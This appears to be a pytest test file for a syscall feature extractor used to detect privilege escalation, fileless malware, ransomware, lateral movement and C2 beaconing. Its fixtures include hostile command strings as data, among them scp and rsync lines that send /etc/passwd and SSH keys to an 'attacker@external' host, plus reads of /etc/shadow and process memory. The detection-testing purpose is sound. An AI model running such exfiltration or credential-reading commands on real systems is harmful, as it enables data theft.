"""Unit tests for :mod:`core.feature_extractor`.

All tests are Windows-safe — no Linux or eBPF dependencies required.
"""

from __future__ import annotations

import math

import numpy as np
import pytest

from core.feature_extractor import (
    CLONE,
    CONNECT,
    EXECVE,
    EXECVEAT,
    FEATURE_NAMES,
    MPROTECT,
    MMAP,
    OPENAT,
    PTRACE,
    READ,
    RENAME,
    SENDTO,
    SETUID,
    SOCKET,
    WRITE,
    FeatureExtractor,
    FeatureVector,
    SyscallEvent,
    UNLINK,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def _make_event(
    syscall_id: int,
    arg: str = "",
    timestamp_ns: int = 1_000_000_000,
    pid: int = 1000,
    ppid: int = 1,
    uid: int = 1000,
    comm: str = "test",
) -> SyscallEvent:
    """Convenience factory for :class:`SyscallEvent`."""
    return SyscallEvent(
        pid=pid,
        ppid=ppid,
        uid=uid,
        syscall_id=syscall_id,
        timestamp_ns=timestamp_ns,
        comm=comm,
        arg=arg,
    )


@pytest.fixture
def extractor() -> FeatureExtractor:
    """Return a fresh :class:`FeatureExtractor` instance."""
    return FeatureExtractor()


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------
class TestNormalBehavior:
    """Events that mimic ordinary file-I/O (openat + write)."""

    def test_normal_behavior(self, extractor: FeatureExtractor) -> None:
        events = [
            _make_event(OPENAT, arg="/home/user/file.txt", timestamp_ns=1_000_000_000),
            _make_event(WRITE, arg="", timestamp_ns=1_100_000_000),
            _make_event(OPENAT, arg="/tmp/data.csv", timestamp_ns=1_200_000_000),
            _make_event(WRITE, arg="", timestamp_ns=1_300_000_000),
            _make_event(WRITE, arg="", timestamp_ns=1_400_000_000),
        ]

        fv = extractor.extract(events)

        assert isinstance(fv, FeatureVector)
        assert fv.features.shape == (33,)

        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}

        assert fv.features[idx["syscall_count"]] == 5.0
        assert fv.features[idx["ptrace_count"]] == 0.0
        assert fv.features[idx["setuid_count"]] == 0.0
        assert fv.features[idx["priv_esc_sequence"]] == 0.0
        assert fv.features[idx["uid_change_attempt"]] == 0.0
        assert fv.features[idx["shell_spawn"]] == 0.0
        # Entropy should be > 0 (two distinct syscall types).
        assert fv.features[idx["syscall_entropy"]] > 0.0


class TestAttackBehavior:
    """Events that mimic a privilege-escalation attack."""

    def test_attack_behavior(self, extractor: FeatureExtractor) -> None:
        events = [
            _make_event(PTRACE, arg="", timestamp_ns=1_000_000_000),
            _make_event(SETUID, arg="", timestamp_ns=2_000_000_000),
            _make_event(EXECVE, arg="/bin/sh", timestamp_ns=3_000_000_000),
        ]

        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}

        assert fv.features[idx["priv_esc_sequence"]] == 1.0
        assert fv.features[idx["shell_spawn"]] >= 1.0
        assert fv.features[idx["uid_change_attempt"]] == 1.0
        assert fv.features[idx["ptrace_count"]] == 1.0
        assert fv.features[idx["setuid_count"]] == 1.0
        assert fv.features[idx["execve_count"]] == 1.0


class TestEdgeCases:
    """Edge-case coverage: empty list, single event."""

    def test_empty_events(self, extractor: FeatureExtractor) -> None:
        fv = extractor.extract([])

        assert fv.features.shape == (33,)
        assert np.all(fv.features == 0.0)
        assert fv.pid == 0
        assert fv.comm == ""

    def test_single_event(self, extractor: FeatureExtractor) -> None:
        events = [_make_event(OPENAT, arg="/tmp/x", timestamp_ns=5_000_000_000)]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}

        assert fv.features[idx["syscall_count"]] == 1.0
        assert fv.features[idx["unique_syscalls"]] == 1.0
        assert fv.features[idx["openat_count"]] == 1.0
        # Rate is 0 when there's only one event (zero time span).
        assert fv.features[idx["syscall_rate"]] == 0.0
        # Entropy of a single type is 0.
        assert fv.features[idx["syscall_entropy"]] == 0.0


class TestEntropy:
    """Verify Shannon entropy calculation."""

    def test_single_type_entropy_is_zero(self, extractor: FeatureExtractor) -> None:
        """Uniform single-type → entropy = 0."""
        events = [
            _make_event(WRITE, timestamp_ns=i * 100_000_000)
            for i in range(10)
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}
        assert fv.features[idx["syscall_entropy"]] == pytest.approx(0.0)

    def test_mixed_types_entropy_positive(self, extractor: FeatureExtractor) -> None:
        """Two equally distributed types → entropy = 1 bit."""
        events = [
            _make_event(WRITE, timestamp_ns=1_000_000_000),
            _make_event(OPENAT, timestamp_ns=2_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}
        assert fv.features[idx["syscall_entropy"]] == pytest.approx(1.0, abs=1e-6)

    def test_three_types_entropy(self, extractor: FeatureExtractor) -> None:
        """Three equally distributed types → entropy = log₂(3) ≈ 1.585."""
        events = [
            _make_event(WRITE, timestamp_ns=1_000_000_000),
            _make_event(OPENAT, timestamp_ns=2_000_000_000),
            _make_event(EXECVE, timestamp_ns=3_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}
        expected = math.log2(3)
        assert fv.features[idx["syscall_entropy"]] == pytest.approx(expected, abs=1e-6)


class TestSensitiveFileDetection:
    """Ensure sensitive paths are counted correctly."""

    def test_shadow_file(self, extractor: FeatureExtractor) -> None:
        events = [
            _make_event(OPENAT, arg="/etc/shadow", timestamp_ns=1_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}
        assert fv.features[idx["sensitive_file_access"]] == 1.0

    def test_multiple_sensitive_files(self, extractor: FeatureExtractor) -> None:
        events = [
            _make_event(OPENAT, arg="/etc/passwd", timestamp_ns=1_000_000_000),
            _make_event(OPENAT, arg="/etc/shadow", timestamp_ns=2_000_000_000),
            _make_event(OPENAT, arg="/home/user/.ssh/id_rsa", timestamp_ns=3_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}
        assert fv.features[idx["sensitive_file_access"]] == 3.0

    def test_non_sensitive_file_ignored(self, extractor: FeatureExtractor) -> None:
        events = [
            _make_event(OPENAT, arg="/tmp/safe_file.txt", timestamp_ns=1_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}
        assert fv.features[idx["sensitive_file_access"]] == 0.0

    def test_proc_self(self, extractor: FeatureExtractor) -> None:
        events = [
            _make_event(OPENAT, arg="/proc/self/maps", timestamp_ns=1_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}
        assert fv.features[idx["sensitive_file_access"]] == 1.0


class TestPrivEscPatterns:
    """Detailed tests for privilege-escalation sequence detection."""

    def test_setuid_then_execve(self, extractor: FeatureExtractor) -> None:
        events = [
            _make_event(SETUID, timestamp_ns=1_000_000_000),
            _make_event(EXECVE, arg="/bin/bash", timestamp_ns=2_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}
        assert fv.features[idx["priv_esc_sequence"]] == 1.0

    def test_ptrace_then_setuid(self, extractor: FeatureExtractor) -> None:
        events = [
            _make_event(PTRACE, timestamp_ns=1_000_000_000),
            _make_event(SETUID, timestamp_ns=2_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}
        assert fv.features[idx["priv_esc_sequence"]] == 1.0

    def test_no_pattern(self, extractor: FeatureExtractor) -> None:
        events = [
            _make_event(EXECVE, arg="/usr/bin/ls", timestamp_ns=1_000_000_000),
            _make_event(PTRACE, timestamp_ns=2_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}
        assert fv.features[idx["priv_esc_sequence"]] == 0.0


# =========================================================================
# NEW TESTS: Fileless Malware Detection (T1.x)
# =========================================================================
class TestFilelessMalwareDetection:
    """Tests for fileless malware detection features (indices 15-20)."""

    def test_mprotect_rx_detection(self, extractor: FeatureExtractor) -> None:
        """T1.1: mprotect PROT_EXEC should increment memprotect_rx_count."""
        events = [
            _make_event(MPROTECT, arg="PROT_READ|PROT_EXEC", timestamp_ns=1_000_000_000),
            _make_event(MPROTECT, arg="PROT_WRITE|PROT_EXEC", timestamp_ns=2_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}

        assert fv.features[idx["memprotect_rx_count"]] >= 2.0
        assert fv.features[idx["fileless_score"]] > 0.0

    def test_anonymous_mmap_detection(self, extractor: FeatureExtractor) -> None:
        """T1.2: Anonymous mmap should increment anonymous_mmap_count."""
        events = [
            _make_event(MMAP, arg="MAP_ANONYMOUS", timestamp_ns=1_000_000_000),
            _make_event(MMAP, arg="MAP_ANONYMOUS", timestamp_ns=2_000_000_000),
            _make_event(MMAP, arg="MAP_ANONYMOUS", timestamp_ns=3_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}

        assert fv.features[idx["anonymous_mmap_count"]] >= 3.0
        assert fv.features[idx["fileless_score"]] > 0.0

    def test_dev_shm_fileless_execution(self, extractor: FeatureExtractor) -> None:
        """T1.6: Execution from /dev/shm should set fileless_exec=True."""
        events = [
            _make_event(EXECVE, arg="/dev/shm/payload", timestamp_ns=1_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}

        assert fv.features[idx["fileless_exec"]] == 1.0
        assert fv.features[idx["fileless_score"]] >= 0.5
        assert fv.fileless_exec is True

    def test_memfd_pattern_detection(self, extractor: FeatureExtractor) -> None:
        """T1.3: memfd_create pattern should trigger fileless detection."""
        events = [
            _make_event(EXECVE, arg="memfd:shellcode", timestamp_ns=1_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}

        assert fv.features[idx["fileless_exec"]] == 1.0
        assert fv.fileless_exec is True

    def test_fd_based_exec_detection(self, extractor: FeatureExtractor) -> None:
        """T1.3: execveat (fd-based execution) should increment fd_based_exec_count."""
        events = [
            _make_event(EXECVEAT, arg="/dev/fd/3", timestamp_ns=1_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}

        assert fv.features[idx["fd_based_exec_count"]] >= 1.0

    def test_memory_toggle_pattern(self, extractor: FeatureExtractor) -> None:
        """T1.4: Memory region toggle (write -> mprotect RX) should be detected."""
        events = [
            _make_event(WRITE, arg="", timestamp_ns=500_000_000),
            _make_event(MPROTECT, arg="PROT_EXEC", timestamp_ns=800_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}

        # Memory toggle should be detected (events within 1 second)
        assert fv.features[idx["memory_region_toggle_count"]] >= 1.0

    def test_proc_fd_execution(self, extractor: FeatureExtractor) -> None:
        """T1.6: Execution via /proc/self/fd should trigger fileless detection."""
        events = [
            _make_event(EXECVE, arg="/proc/self/fd/3", timestamp_ns=1_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}

        assert fv.features[idx["fileless_exec"]] == 1.0
        assert fv.fileless_exec is True


# =========================================================================
# NEW TESTS: Ransomware Detection (T2.x)
# =========================================================================
class TestRansomwareDetection:
    """Tests for ransomware detection features (indices 21-26)."""

    def test_mass_file_encryption(self, extractor: FeatureExtractor) -> None:
        """T2.1: Mass file encryption pattern should trigger detection."""
        events = [
            _make_event(OPENAT, arg=f"/home/user/file{i}.txt", timestamp_ns=100_000_000 * i)
            for i in range(1, 55)
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}

        assert fv.features[idx["unique_file_opens"]] >= 50
        assert fv.features[idx["ransomware_score"]] >= 0.4

    def test_ransom_note_detection(self, extractor: FeatureExtractor) -> None:
        """T2.2: Ransom note pattern should trigger detection."""
        events = [
            _make_event(OPENAT, arg="DECRYPT_INSTRUCTIONS.html", timestamp_ns=1_000_000_000),
            _make_event(WRITE, arg="PAY 0.5 BTC TO THIS ADDRESS", timestamp_ns=2_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}

        assert fv.features[idx["ransom_note_pattern"]] == 1.0
        assert fv.features[idx["ransomware_score"]] >= 0.5

    def test_rapid_file_deletion(self, extractor: FeatureExtractor) -> None:
        """T2.4: Rapid file deletion should trigger detection."""
        events = [
            _make_event(UNLINK, arg=f"/tmp/file{i}.tmp", timestamp_ns=100_000_000 * i)
            for i in range(1, 25)
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}

        assert fv.features[idx["delete_operations"]] >= 20
        assert fv.features[idx["ransomware_score"]] >= 0.3

    def test_ransomware_encrypted_extension(self, extractor: FeatureExtractor) -> None:
        """T2.1: Files with .encrypted extension should trigger detection."""
        events = [
            _make_event(OPENAT, arg="/home/user/doc.encrypted", timestamp_ns=1_000_000_000),
            _make_event(OPENAT, arg="/home/user/photo.encrypted", timestamp_ns=2_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}

        assert fv.features[idx["write_to_new_files"]] >= 2.0

    def test_combined_ransomware_score(self, extractor: FeatureExtractor) -> None:
        """T2.1: Combined ransomware features should produce high score."""
        events = (
            [
                _make_event(OPENAT, arg=f"/home/user/file{i}.txt", timestamp_ns=100_000_000 * i)
                for i in range(1, 55)
            ] +
            [
                _make_event(UNLINK, arg=f"/home/user/file{i}.txt", timestamp_ns=100_000_000 * i)
                for i in range(1, 25)
            ] +
            [
                _make_event(OPENAT, arg="README_DECRYPT.html", timestamp_ns=6_000_000_000),
            ]
        )
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}

        assert fv.features[idx["unique_file_opens"]] >= 50
        assert fv.features[idx["delete_operations"]] >= 20
        assert fv.features[idx["ransom_note_pattern"]] >= 1.0
        assert fv.features[idx["ransomware_score"]] >= 0.8


# =========================================================================
# NEW TESTS: Lateral Movement Detection (T3.x)
# =========================================================================
class TestLateralMovementDetection:
    """Tests for lateral movement detection features (indices 27-30)."""

    def test_ssh_remote_execution(self, extractor: FeatureExtractor) -> None:
        """T3.1: SSH remote execution should trigger detection."""
        events = [
            _make_event(EXECVE, arg="/usr/bin/ssh root@10.0.0.5 ls", timestamp_ns=1_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}

        assert fv.features[idx["ssh_remote_exec"]] >= 1.0
        assert fv.features[idx["lateral_movement_score"]] >= 0.5

    def test_scp_exfiltration(self, extractor: FeatureExtractor) -> None:
        """T3.6: scp with sensitive files should trigger detection."""
        events = [
            _make_event(EXECVE, arg="/usr/bin/scp /etc/passwd attacker@external:/tmp/", timestamp_ns=1_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}

        assert fv.features[idx["ssh_remote_exec"]] >= 1.0
        assert fv.features[idx["lateral_movement_score"]] >= 0.5

    def test_credential_dumping_proc_mem(self, extractor: FeatureExtractor) -> None:
        """T3.2: Reading /proc/<pid>/mem should trigger credential access detection."""
        events = [
            _make_event(READ, arg="/proc/1234/mem", timestamp_ns=1_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}

        assert fv.features[idx["credential_access_count"]] >= 1.0
        assert fv.features[idx["lateral_movement_score"]] >= 0.4

    def test_ssh_key_access(self, extractor: FeatureExtractor) -> None:
        """T3.2: Accessing SSH keys should trigger detection."""
        events = [
            _make_event(OPENAT, arg="/home/user/.ssh/id_rsa", timestamp_ns=1_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}

        assert fv.features[idx["credential_access_count"]] >= 1.0

    def test_rsync_lateral_movement(self, extractor: FeatureExtractor) -> None:
        """T3.1: rsync should trigger lateral movement detection."""
        events = [
            _make_event(EXECVE, arg="/usr/bin/rsync -a /home/user/.ssh/ attacker@external:/backup/", timestamp_ns=1_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}

        assert fv.features[idx["ssh_remote_exec"]] >= 1.0
        assert fv.features[idx["lateral_movement_score"]] >= 0.5


# =========================================================================
# NEW TESTS: C2 Communication Detection (T4.x)
# =========================================================================
class TestC2Detection:
    """Tests for C2 communication detection features (indices 31-32)."""

    def test_beaconing_c2_detection(self, extractor: FeatureExtractor) -> None:
        """T4.1: Regular connection intervals should indicate beaconing C2."""
        # Connections at regular 30-second intervals (beacon pattern)
        events = [
            _make_event(CONNECT, arg="4444", timestamp_ns=1_000_000_000),
            _make_event(CONNECT, arg="4444", timestamp_ns=31_000_000_000),
            _make_event(CONNECT, arg="4444", timestamp_ns=61_000_000_000),
            _make_event(CONNECT, arg="4444", timestamp_ns=91_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}

        # Beacon periodicity should be low (regular intervals)
        assert fv.features[idx["beacon_periodicity"]] < 0.5

    def test_non_standard_port_c2(self, extractor: FeatureExtractor) -> None:
        """T4.3: Non-standard port connections should trigger detection."""
        events = [
            _make_event(CONNECT, arg="4444", timestamp_ns=1_000_000_000),
            _make_event(CONNECT, arg="5555", timestamp_ns=2_000_000_000),
            _make_event(CONNECT, arg="6666", timestamp_ns=3_000_000_000),
        ]
        fv = extractor.extract(events)
        idx = {name: i for i, name in enumerate(FEATURE_NAMES)}

        assert fv.features[idx["non_standard_port_count"]] >= 1.0


# =========================================================================
# NEW TESTS: Feature Count and Metadata
# =========================================================================
class TestFeatureVectorMetadata:
    """Ensure the envelope metadata is set correctly."""

    def test_feature_names_length(self) -> None:
        """Feature count should be 33 (original 15 + new features)."""
        assert len(FEATURE_NAMES) == 33

    def test_feature_names_on_vector(self, extractor: FeatureExtractor) -> None:
        fv = extractor.extract([_make_event(WRITE)])
        assert fv.feature_names == FEATURE_NAMES
        assert len(fv.features) == 33

    def test_type_error_on_bad_input(self, extractor: FeatureExtractor) -> None:
        with pytest.raises(TypeError):
            extractor.extract("not a list")  # type: ignore[arg-type]

    def test_all_feature_names_present(self) -> None:
        """Verify all expected feature names are present."""
        expected_names = [
            # Original 15
            "syscall_count", "unique_syscalls", "execve_count", "openat_count",
            "connect_count", "ptrace_count", "setuid_count", "clone_count",
            "write_count", "syscall_rate", "sensitive_file_access", "shell_spawn",
            "uid_change_attempt", "syscall_entropy", "priv_esc_sequence",
            # Fileless (6)
            "memprotect_rx_count", "anonymous_mmap_count", "fd_based_exec_count",
            "memory_region_toggle_count", "fileless_score", "fileless_exec",
            # Ransomware (6)
            "unique_file_opens", "write_to_new_files", "delete_operations",
            "file_extension_diversity", "ransom_note_pattern", "ransomware_score",
            # Lateral movement (4)
            "ssh_remote_exec", "credential_access_count", "port_scan_count",
            "lateral_movement_score",
            # C2 (2)
            "beacon_periodicity", "non_standard_port_count",
        ]
        assert FEATURE_NAMES == expected_names
